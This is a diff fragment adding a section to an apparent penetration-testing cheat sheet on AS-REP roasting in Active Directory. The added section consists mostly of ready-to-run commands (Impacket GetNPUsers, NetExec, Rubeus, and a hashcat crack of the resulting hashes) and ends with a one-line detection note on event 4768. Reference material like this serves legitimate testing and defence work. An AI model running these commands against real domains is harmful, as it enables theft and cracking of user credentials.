@@ -31,3 +31,21 @@ sequenceDiagram
 
 ### Exhaustive commands
 ```bash
+# ── Impacket ─────────────────────────────────────────────────────────
+impacket-GetNPUsers corp.local/ -usersfile users.txt \
+  -dc-ip 10.10.10.5 -format hashcat -outputfile asrep.txt
+
+# ── NetExec ──────────────────────────────────────────────────────────
+nxc ldap 10.10.10.5 -u lowpriv -p 'Password123!' --asreproast asrep.txt
+
+# ── Rubeus (Windows) ─────────────────────────────────────────────────
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# ── Crack ────────────────────────────────────────────────────────────
+hashcat -m 18200 asrep.txt rockyou.txt
+```
+
+### Detection
+**4768 `PreAuthType=0`** for accounts that normally require preauth.
+
+---
